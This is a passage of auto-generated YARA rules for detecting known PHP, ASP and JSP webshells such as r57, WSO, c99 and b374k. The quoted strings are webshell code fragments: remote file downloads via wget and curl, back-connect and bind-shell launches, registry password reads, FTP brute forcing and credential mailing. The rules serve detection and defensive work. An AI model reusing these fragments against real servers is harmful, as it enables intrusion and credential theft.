      $s8 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s9 = "sbFile.append(\" &nbsp;<a href=\\\"javascript:doForm('edit','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'," ascii
      $s10 = "sbFolder.append(\"  <a href=\\\"javascript:doForm('','\"+formatPath(list[i].getAbsolutePath())+\"','','\"+strCmd+\"','1','');" ascii
      $s11 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
      $s12 = "sbFolder.append(\"<tr><td >&nbsp;</td><td><a href=\\\"javascript:doForm('','\"+formatPath(objFile.getParentFile().getAbsolutePat" ascii
      $s13 = "response.setHeader(\"content-type\",\"text/html; charset=ISO-8859-1\");" fullword ascii
      $s14 = "response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
      $s15 = "private final String lineSeparator = System.getProperty(\"line.separator\", \"\\n\");" fullword ascii
      $s16 = "sbFolder.append(strParentFolder[languageNo]+\"</a><br>- - - - - - - - - - - </td></tr>\\r\\n \");" fullword ascii
      $s17 = "if (ht.get(\"cqqUploadFile\") != null)" fullword ascii
      $s18 = "String strContent=request.getParameter(\"content\");" fullword ascii
      $s19 = "if (!f1.renameTo(new File(path + f1.getName()))) " fullword ascii
      $s20 = "BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 90KB and ( 8 of them )
      ) or ( all of them )
}

rule ____1__r00tsFSO_76 {
   meta:
      description = "webshell - from files .asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash2 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash3 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "Passwd=Wsh.RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultPassword\")" fullword ascii
      $s2 = "autoLoginPassKey = \"DefaultPassword\"" fullword ascii
      $s3 = "Admin=Wsh.RegRead(\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\DefaultUserName\")" fullword ascii
      $s4 = "isAutologin=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AutoAdminLogon\"" fullword ascii
      $s5 = "autoLoginPath = \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\"" fullword ascii
      $s6 = "AdminNameKey=\"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\AltDefaultUserName\"" fullword ascii
      $s7 = "autoLoginEnableKey = \"AutoAdminLogon\"" fullword ascii
      $s8 = "autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)" fullword ascii
      $s9 = "autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)" fullword ascii
      $s10 = "Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey" fullword ascii
      $s11 = "autoLoginUserKey = \"DefaultUserName\"" fullword ascii
      $s12 = "Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword" fullword ascii
      $s13 = "isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)" fullword ascii
      $s14 = "displogin=wsh.regRead(\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DontDisplayLastUserN" ascii
      $s15 = "If fso.FileExists(sysdriver&\"\\Documents And Settings\\All Users\\Application Data\\Symantec\\\"&servername&\".cif\") Then" fullword ascii
      $s16 = "su.exe" fullword ascii
      $s17 = "ApdKey=\"HKLM\\SYSTEM\\ControlSet001\\Services\\Tcpip\\Linkage\\Bind\"" fullword ascii
      $s18 = "If displogin=\"\" or displogin=0 Then disply=\"" fullword ascii
      $s19 = "Autologin=Wsh.RegRead(isAutologin)" fullword ascii
      $s20 = "If isAutoLoginEnable = 0 Then" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_r57_kartal_r57_r57_iFX_77 {
   meta:
      description = "webshell - from files r57shell127.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, r57_kartal.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash3 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash5 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash6 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash7 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s2 = "echo (!empty($_POST['php_eval'])?($_POST['php_eval']):(\"/* delete script */\\r\\n//unlink(\\\"r57shell.php\\\");\\r\\n//readfil" ascii
      $s3 = "echo sr(15,\"<b>\".$lang[$language.'_text36'].$arrow.\"</b>\",in('text','test3_md',15,(!empty($_POST['test3_md'])?($_POST['test3" ascii
      $s4 = " $_POST['cmd'] = which('curl').\" \".$_POST['rem_file'].\" -o \".$_POST['loc_file'].\"\";" fullword ascii
      $s5 = "?($_POST['test3_mp']):(\"password\"))).ws(4).\"<b>\".$lang[$language.'_text14'].$arrow.\"</b>\".in('text','test3_port',15,(!empt" ascii
      $s6 = " $blah = ex($p2.\" /tmp/dp \".$_POST['local_port'].\" \".$_POST['remote_host'].\" \".$_POST['remote_port'].\" &\");" fullword ascii
      $s7 = " $blah = ex($p2.\" /tmp/back \".$_POST['ip'].\" \".$_POST['port'].\" &\");" fullword ascii
      $s8 = " $blah = ex($p2.\" /tmp/bdpl \".$_POST['port'].\" &\");" fullword ascii
      $s9 = "echo sr(15,\"<b>\".$lang[$language.'_text53'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;/tmp )\");" fullword ascii
      $s10 = "@copy($HTTP_POST_FILES['userfile']['tmp_name']," fullword ascii
      $s11 = " $blah = ex(\"/tmp/bd \".$_POST['port'].\" \".$_POST['bind_pass'].\" &\");" fullword ascii
      $s12 = " $_POST['cmd'] = which('lynx').\" -source \".$_POST['rem_file'].\" > \".$_POST['loc_file'].\"\";" fullword ascii
      $s13 = " $_POST['cmd'] = which('wget').\" \".$_POST['rem_file'].\" -O \".$_POST['loc_file'].\"\";" fullword ascii
      $s14 = " $_POST['cmd'] = which('links').\" -source \".$_POST['rem_file'].\" > \".$_POST['loc_file'].\"\";" fullword ascii
      $s15 = "echo sr(15,\"<b>\".$lang[$language.'_text73'].$arrow.\"</b>\",in('text','s_dir',85,$dir).\" * ( /root;/home;/tmp )\");" fullword ascii
      $s16 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test3_file',96,(!empty($_POST['test3_file'])?($_POST['t" ascii
      $s17 = " $blah = ex(\"/tmp/dpc \".$_POST['local_port'].\" \".$_POST['remote_port'].\" \".$_POST['remote_host'].\" &\");" fullword ascii
      $s18 = " $blah = ex(\"gcc -o /tmp/backc /tmp/back.c\");" fullword ascii
      $s19 = " $blah = ex(\"gcc -o /tmp/dpc /tmp/dpc.c\");" fullword ascii
      $s20 = "else { $nfn = $HTTP_POST_FILES['userfile']['name']; }" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _EgY_SpIdEr_ShElL_V2_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_78 {
   meta:
      description = "webshell - from files EgY_SpIdEr ShElL V2.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash2 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash3 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
   strings:
      $s1 = "echo sr(35,in('hidden','dir',0,$dir).in('hidden','cmd',0,'mysql_dump').\"<b>\".$lang[$language.'_text41'].$arrow.\"</b>\",in('ch" ascii
      $s2 = "  else if(!$sql->dump($_POST['mysql_tbl'])) { echo \"[-] ERROR! Can't create dump\"; }" fullword ascii
      $s3 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test5_file',96,(!empty($_POST['test5_file'])?($_POST['t" ascii
      $s4 = "   $this->dump[1] = '## --------------------------------------- ';" fullword ascii
      $s5 = "     $this->dump[] = '## --------------------------------------- ';" fullword ascii
      $s6 = "   $this->dump[5] = '## --------------------------------------- ';" fullword ascii
      $s7 = "echo sr(15,\"<b>\".$lang[$language.'_text30'].$arrow.\"</b>\",in('text','test7_file',96,(!empty($_POST['test7_file'])?($_POST['t" ascii
      $s8 = "      $str = \"host='\".$this->host.\"' port='\".$this->port.\"' user='\".$this->user.\"' password='\".$this->pass.\"' dbname='" ascii
      $s9 = "      $str = \"host='\".$this->host.\"' port='\".$this->port.\"' user='\".$this->user.\"' password='\".$this->pass.\"' dbname='" ascii
      $s10 = "   if(empty($_POST['dif'])) { foreach($sql->dump as $v) echo $v.\"\\r\\n\"; }" fullword ascii
      $s11 = " function dump($table)" fullword ascii
      $s12 = "  $sql->host = $_POST['db_server'];" fullword ascii
      $s13 = "echo sr(15,\"<b>\".$lang[$language.'_text4'].$arrow.\"</b>\",in('text','test6_file',96,(!empty($_POST['test6_file'])?($_POST['te" ascii
      $s14 = "     $this->dump[0] = '## PostgreSQL dump';" fullword ascii
      $s15 = " $sql->host = $_POST['db_server'];" fullword ascii
      $s16 = "   $this->dump[2] = '##  Created: '.date (\"d/m/Y H:i:s\");" fullword ascii
      $s17 = "  $sql->port = $_POST['db_port'];" fullword ascii
      $s18 = "_file']):(\"/etc/passwd\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test7').ws(4).in('submit','submit',0,$lang[$language" ascii
      $s19 = "  $sql->user = $_POST['mysql_l'];" fullword ascii
      $s20 = "_file']):(\"/etc/passwd\"))).in('hidden','dir',0,$dir).in('hidden','cmd',0,'test5').ws(4).in('submit','submit',0,$lang[$language" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_1_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_79 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.1.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash4 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash5 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash6 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash7 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s2 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s3 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s4 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s5 = "if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s6 = "d.mf.p3.value = encrypt(d.mf.p3.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s7 = "echo \"<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s8 = "d.mf.a.value = encrypt(d.mf.a.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s9 = "d.mf.c.value = encrypt(d.mf.c.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s10 = "d.mf.p1.value = encrypt(d.mf.p1.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s11 = "d.mf.p2.value = encrypt(d.mf.p2.value,'\".$_COOKIE[md5($_SERVER['HTTP_HOST']).\"key\"].\"');" fullword ascii
      $s12 = "if(isset($_POST['p2'])) $_POST['p2'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s13 = "if(isset($_POST['a'])) $_POST['a'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s14 = "if(isset($_POST['p1'])) $_POST['p1'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s15 = "if(isset($_POST['c'])) $_POST['c'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])" ascii
      $s16 = "if(isset($_POST['p3'])) $_POST['p3'] = iconv(\"utf-8\", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST" ascii
      $s17 = "<input type='submit' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.valu" ascii
      $s18 = "echo \"<input type='checkbox' onclick='is();'> <input type=submit value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s19 = "<td><form onsubmit=\\\"\".( function_exists('actionConsole')? \"g('Console',null,this.c.value);\":'' ).\"return false;\\\"><span" ascii
      $s20 = "$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax'] = true;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_1_WSO_4_0_5_wso_4_2_5_wso_4_1_3__v_wso_4_2_2_wso_80 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.1.php, WSO_4_0_5.php, wso-4.2.5.php, wso-4.1.3.php, .v.php, wso-4.2.2.php, wso.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash4 = "77199ceff72c318f15de256bc93220d21a2bd28d04e6d3d18726c8c272f96eab"
      hash5 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash6 = "d5c1ad546ed97c268eda69f7cc540cab296075a26d986447622825dc8767eec3"
      hash7 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash8 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
      hash9 = "ef740d974b11cf6c8da3d4e81785236e4f6ba1d5b0b7a89787955963bcba5f6d"
   strings:
      $s1 = "if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s2 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,null,this." ascii
      $s3 = "echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit=\"if(this.ajax.checked){a(null,null,this." ascii
      $s4 = "echo @file_get_contents($temp);" fullword ascii
      $s5 = "function bruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s6 = "$target=$_SERVER['DOCUMENT_ROOT'];" fullword ascii
      $s7 = "foreach (ListFiles($target) as $key=>$file){" fullword ascii
      $s8 = "showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s9 = "$temp = \"document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='\".addcslashes(h" ascii
      $s10 = "$temp = \"document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='\".addcslashes(h" ascii
      $s11 = "if(@copy(\"compress.zlib://\".$_POST['p2'], $temp)){" fullword ascii
      $s12 = "echo '<h1>Safe mode bypass</h1><div class=content>';" fullword ascii
      $s13 = "showSecParam('Supported databases', implode(', ', $temp));" fullword ascii
      $s14 = "if($_POST['p1'] == 'infect') {" fullword ascii
      $s15 = "showSecParam('Mount options', @file_get_contents('/etc/fstab'));" fullword ascii
      $s16 = "<span>Bind port to /bin/sh</span><br/>" fullword ascii
      $s17 = "echo \"<form method=post><input type=submit value=Infect name=infet></form>\";" fullword ascii
      $s18 = "$tmp = preg_replace('!a:\\w+ {.*}!msiU','',$tmp);" fullword ascii
      $s19 = "echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',f" ascii
      $s20 = "echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',f" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _NetworkFileManagerPHP_NIX_REMOTE_WEB_SHELL_81 {
   meta:
      description = "webshell - from files NetworkFileManagerPHP.php, NIX REMOTE WEB-SHELL.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "0863907cbabc1679e00a99f84c5adc3ff4daab11aa0df970e37f051c770d31ed"
      hash2 = "6ee85fade63001a1129d3fd66223066647377a49cfeec4e92b075988fe937b2f"
   strings:
      $s1 = "       fputs($f,\"Enter on ftp:\\nFTPhosting:\\t$host\\nLogin:\\t$login\\nPassword:\\t$password\\n \");" fullword ascii
      $s2 = "if($file && $host && $login){" fullword ascii
      $s3 = "  $info .= \"HOST:\\t$HTTP_HOST\\n\";" fullword ascii
      $s4 = "<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;Login:</td>" fullword ascii
      $s5 = "     fputs($open_ftp,\"user $login\\n\");" fullword ascii
      $s6 = "  $headers = \"From: $demail\\nContent-type: multipart/mixed; boundary=\\\"$boundary\\\"\";" fullword ascii
      $s7 = "if (@unlink(\"pass.txt\") < 0){" fullword ascii
      $s8 = "  $info .= \"URL:\\t$HTTP_REFERER\\n\";" fullword ascii
      $s9 = "  $info .= \"IP:\\t$REMOTE_ADDR\\n\";" fullword ascii
      $s10 = "  $info .= \"DOC_ROOT:\\t$PATH_TRANSLATED\\n\";" fullword ascii
      $s11 = "  if (!empty($HTTP_GET_VARS))" fullword ascii
      $s12 = "     fputs($open_ftp,\"pass $password\\n\");" fullword ascii
      $s13 = "<input class='inputbox' type='text' name='login' size=50></td></tr>" fullword ascii
      $s14 = "0987654321" ascii /* reversed goodware string '1234567890' */
      $s15 = "   fputs($f,\"$login$r\\n\");" fullword ascii
      $s16 = "<tr><td align=center class=pagetitle width=150>&nbsp;&nbsp;FTPHost:</td>" fullword ascii
      $s17 = "   $open_ftp=@fsockopen($host,21);" fullword ascii
      $s18 = "  $info .=\"--$boundary\\nContent-type: text/plain; charset=iso-8859-1\\nContent-transfer-encoding: 8bit\\n\\n\\n\\n--$boundary" ascii
      $s19 = "<TABLE CELLPADDING=0 CELLSPACING=0 bgcolor=#0066CC BORDER=1 width=300 align=center bordercolor=#808080 bordercolorlight=black bo" ascii
      $s20 = "  $send = mail($send_to, $subject, $info, $headers);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _EgY_SpIdEr_ShElL_V2_c99_locus7s_82 {
   meta:
      description = "webshell - from files EgY_SpIdEr ShElL V2.php, c99_locus7s.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash2 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                      ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAEAAAA" ascii /* base64 encoded string '    @  ' */
      $s5 = "AABAAAAAAAAAAAAAAABAAAAAAAAAD" ascii /* base64 encoded string '  @           @      ' */
      $s6 = "AAAAAAAAAAAAAAABAAAAAAAAA" ascii /* base64 encoded string '           @      ' */
      $s7 = "AAAAAAAAAAAAAABAD" ascii /* base64 encoded string '           @' */
      $s8 = "AAAAAAAAAAAAAABAAAAAAAAAC" ascii /* base64 encoded string '           @      ' */
      $s9 = "AAAAAAAAAAAAAAC" ascii /* base64 encoded string '           ' */
      $s10 = "AEAAAAAAAAAA" ascii /* base64 encoded string ' @       ' */
      $s11 = "AAAAAAAAAD" ascii /* base64 encoded string '       ' */
      $s12 = "AAAAAAAAAAAAAAD" ascii /* base64 encoded string '           ' */
      $s13 = "AAAAAABAAAAAAA" ascii /* base64 encoded string '     @    ' */
      $s14 = "AABAAAAAAAAAAAAAAABAAAAA" ascii /* base64 encoded string '  @           @   ' */
      $s15 = "AAAAAAAAAAAAAEA" ascii /* base64 encoded string '          @' */
      $s16 = "AAAAAAAAAAC4" ascii /* base64 encoded string '       .' */
      $s17 = "AAAA0AAAAAAAAAAAAAAA8AAAA" ascii /* base64 encoded string '  4           <   ' */
      $s18 = "AeAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string 'x             ' */
      $s19 = "AAAAAAAA4AAAA" ascii /* base64 encoded string '     8   ' */
      $s20 = "AbAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string 'l             ' */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _c66_c99shell_Shell__ci___Biz_was_here_c99_83 {
   meta:
      description = "webshell - from files c66.php, c99shell.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash2 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash3 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash4 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $x1 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>\"><input type=hidden" ascii
      $s3 = "if (trim($cmd) == \"ps -aux\") {$act = \"processes\";}" fullword ascii
      $s4 = " \".$datapipe[\"remoteaddr\"].\"</b>! You should use NetCat&copy;, run \\\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"por" ascii
      $s5 = " ?><b>Binding port:</b><br><form action=\"<?php echo $surl; ?>\"><input type=hidden name=act value=tools><input type=hidden name" ascii
      $s6 = "    if ($ext == \"c\") {$retgcc = myshellexec(\"gcc -o \".$binpath.\" \".$srcpath);  @unlink($srcpath);}" fullword ascii
      $s7 = "    if ($ext == \"c\") {$retgcc = myshellexec(\"gcc -o \".$binpath.\" \".$srcpath); @unlink($srcpath);}" fullword ascii
      $s8 = "   echo \"<form action=\\\"\".$surl.\"\\\"><input type=hidden name=act value=\\\"ftpquickbrute\\\"><br>Read first: <input type=t" ascii
      $s9 = "    else {echo \"Binding... ok! Connect to <b>\".getenv(\"SERVER_ADDR\").\":\".$bind[\"port\"].\"</b>! You should use NetCat&cop" ascii
      $s10 = ";Password: <input type=text name=\"bind[pass]\" value=\"<?php echo htmlspecialchars($bind[\"pass\"]); ?>\">&nbsp;<select name=\"" ascii
      $s11 = "\\\"><u>View binder's process</u></a></center>\";}" fullword ascii
      $s12 = "    else {echo \"Running datapipe... ok! Connect to <b>\".getenv(\"SERVER_ADDR\").\":\".$datapipe[\"port\"].\", and you will con" ascii
      $s13 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s14 = "<b>Back connection:</b><br><form action=\"<?php echo $surl; ?>\"><input type=hidden name=act value=tools><input type=hidden name" ascii
      $s15 = " if (empty($bc[\"host\"])) {$bc[\"host\"] = getenv(\"REMOTE_ADDR\");}" fullword ascii
      $s16 = " <td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: <a href=\"<?php echo $surl; ?>act=search&d=<?php echo urlencode($d)" ascii
      $s17 = "    $retbind = myshellexec($v[1].\" > /dev/null &\");" fullword ascii
      $s18 = "?></select>&nbsp;<input type=submit name=dpsubmit value=\"Run\"></form><b>Note:</b> sources will be downloaded from remote serve" ascii
      $s19 = "?></select>&nbsp;<input type=submit name=dpsubmit value=\"Run\"></form><b>Note:</b> sources will be downloaded from remote serve" ascii
      $s20 = "  elseif (fsockopen(getenv(\"SERVER_ADDR\"),$bind[\"port\"],$errno,$errstr,0.1)) {echo \"Port alredy in use, select any other!<b" ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _b374k_2_5_source_b374k_2_6_source_b374k_2_7_source_84 {
   meta:
      description = "webshell - from files b374k-2.5.source.php, b374k-2.6.source.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash2 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash3 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "='rshost_\".$s_rstype.\"' value='\".$s_rstarget.\"' /></td></tr>" fullword ascii
      $s2 = "<link href='http://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700' rel='stylesheet' type='text/css'>" fullword ascii
      $s3 = "$s_result = exe($s_runlang.\" \".$s_fpath.\" \".$s_rstarget);" fullword ascii
      $s4 = "<tr><td style='width:100px;'>\".$s_labelip.\"</td><td><input \".$s_rsdisabled.\" style='width:100%;' class='inputz' type='text' " ascii
      $s5 = "if($s_i_buff=trim(@file_get_contents(\"/proc/partitions\"))){" fullword ascii
      $s6 = "$s_file = wordwrap(@file_get_contents($s_f),160,\"\\n\",true);" fullword ascii
      $s7 = "if($s_i_buff=trim(@file_get_contents(\"/proc/cpuinfo\"))){" fullword ascii
